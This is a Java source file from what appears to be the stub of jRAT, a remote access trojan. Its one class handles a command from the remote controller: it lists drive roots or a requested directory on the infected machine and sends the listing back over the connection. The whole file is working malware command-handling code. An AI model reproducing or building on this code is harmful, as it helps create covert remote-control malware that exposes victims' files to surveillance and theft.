package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet19ListFiles;

import java.io.File;


public class Packet15ListFiles extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String current = Connection.readLine();

		File[] files;

		if (current.length() == 0) {
			files = File.listRoots();
		} else {
			files = new File(current).listFiles();
		}

		Connection.addToSendQueue(new Packet19ListFiles(files));
	}

}
